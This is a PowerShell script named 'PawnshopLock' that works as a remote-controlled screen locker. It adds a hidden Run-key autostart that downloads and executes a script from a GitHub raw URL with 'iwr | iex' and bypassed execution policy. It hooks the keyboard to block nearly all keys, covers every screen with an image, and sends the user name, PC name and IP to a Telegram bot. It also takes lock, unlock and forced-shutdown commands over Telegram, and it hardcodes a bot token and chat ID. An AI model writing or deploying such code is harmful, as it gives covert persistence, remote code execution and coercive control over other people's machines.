# =============================
# PawnshopLock v6.2 - Stable
# =============================
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# --- CONFIG ---
$imageURL = 'https://raw.githubusercontent.com/diezul/x/main/1.png'
$botToken = '7726609488:AAF9dph4FZn5qxo4knBQPS3AnYQf1JAc8Co'
$chatID   = '656189986'
$rawURL   = 'https://raw.githubusercontent.com/diezul/x/main/pawnlock.ps1'

# --- AUTOSTART (one-time) ---
$reg = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
$val = 'PawnshopLock'
$cmd = "powershell -w hidden -ep Bypass -Command `"iwr $rawURL | iex`""
try {
    if ((Get-ItemProperty $reg -Name $val -ErrorAction SilentlyContinue).$val -ne $cmd) {
        Set-ItemProperty -Path $reg -Name $val -Value $cmd
    }
} catch {}

# --- VARS ---
$user    = $env:USERNAME
$pc      = $env:COMPUTERNAME
$lockCmd = "/lock$user".ToLower()
$unlkCmd = "/unlock$user".ToLower()
$shutCmd = "/shutdown$user".ToLower()
$tempImg = "$env:TEMP\pawnlock.jpg"

try { Invoke-WebRequest $imageURL -OutFile $tempImg -UseBasicParsing } catch {}

# --- Telegram Notify ---
function Send-TG($msg) {
    try {
        $body = @{ chat_id = $chatID; text = $msg } | ConvertTo-Json -Compress
        Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" `
            -Method POST -ContentType 'application/json' -Body $body -TimeoutSec 10
    } catch {}
}

# --- IP ---
function Get-IP {
    try {
        (Get-NetIPAddress -AddressFamily IPv4 |
            Where-Object { $_.IPAddress -notmatch '^(127|169\.254|0\.|255|fe80)' })[0].IPAddress
    } catch { 'n/a' }
}

# --- KEYBLOCKER ---
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class KeyBlocker {
    private static IntPtr hookId = IntPtr.Zero;
    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
    private static LowLevelKeyboardProc proc = HookCallback;
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private const int WM_SYSKEYDOWN = 0x0104;

    [DllImport("user32.dll")]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
    [DllImport("user32.dll")]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);
    [DllImport("user32.dll")]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
    [DllImport("kernel32.dll")]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    public static void Block() { if (hookId == IntPtr.Zero) hookId = SetHook(proc); }
    public static void Unblock() { if (hookId != IntPtr.Zero) UnhookWindowsHookEx(hookId); }

    private static IntPtr SetHook(LowLevelKeyboardProc proc) {
        using (var curProcess = System.Diagnostics.Process.GetCurrentProcess())
        using (var curModule = curProcess.MainModule) {
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
        if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN)) {
            int vkCode = Marshal.ReadInt32(lParam);
            if (vkCode == 0x43) return CallNextHookEx(hookId, nCode, wParam, lParam); // Allow C
            return (IntPtr)1; // Block all others
        }
        return CallNextHookEx(hookId, nCode, wParam, lParam);
    }
}
"@

# --- UI + IMAGE ---
Add-Type -AssemblyName System.Windows.Forms,System.Drawing
$forms = $null
function Lock-Screen {
    if ($forms) { return }
    [KeyBlocker]::Block()
    $forms = foreach ($screen in [System.Windows.Forms.Screen]::AllScreens) {
        $f = New-Object Windows.Forms.Form -Property @{
            FormBorderStyle = 'None'; WindowState = 'Maximized'; StartPosition = 'Manual'; TopMost = $true;
            Location = $screen.Bounds.Location; Size = $screen.Bounds.Size; BackColor = 'Black'; KeyPreview = $true
        }
        $pb = New-Object Windows.Forms.PictureBox -Property @{
            Image = [System.Drawing.Image]::FromFile($tempImg); Dock = 'Fill'; SizeMode = 'StretchImage'
        }
        $f.Controls.Add($pb)
        $f.Add_Deactivate({ $_.Activate() })
        $f.Add_KeyDown({ if ($_.KeyCode -eq 'C') { Unlock-Screen }; $_.Handled = $true })
        $f.Show()
        $f
    }
    Send-TG "$pc locked"
}

function Unlock-Screen {
    if (!$forms) { return }
    foreach ($f in $forms) { try { $f.Close() } catch {} }
    $forms = $null
    [KeyBlocker]::Unblock()
    Send-TG "$pc unlocked"
}

# --- INIT ---
Send-TG "PawnshopLock online on $pc ($user) | IP: $(Get-IP())"
$offset = 0

# --- POLL LOOP (Telegram) ---
$timer = New-Object Windows.Forms.Timer
$timer.Interval = 5000
$timer.Add_Tick({
    try {
        $url = "https://api.telegram.org/bot$botToken/getUpdates?offset=$offset"
        $response = Invoke-RestMethod $url -TimeoutSec 10
        foreach ($u in $response.result) {
            $offset = $u.update_id + 1
            $txt = ($u.message.text).ToLower() -replace "@\S+", "" -replace "\s+", ""
            if ($u.message.chat.id -ne [int]$chatID) { continue }
            if ($txt -eq $lockCmd)      { Lock-Screen }
            elseif ($txt -eq $unlkCmd)  { Unlock-Screen }
            elseif ($txt -eq $shutCmd)  { Send-TG "$pc shutting down"; Stop-Computer -Force }
        }
    } catch {}
})
$timer.Start()

# --- KEEP GUI ALIVE ---
[System.Windows.Forms.Application]::Run()

# --- CLEANUP ---
$timer.Stop()
[KeyBlocker]::Unblock()
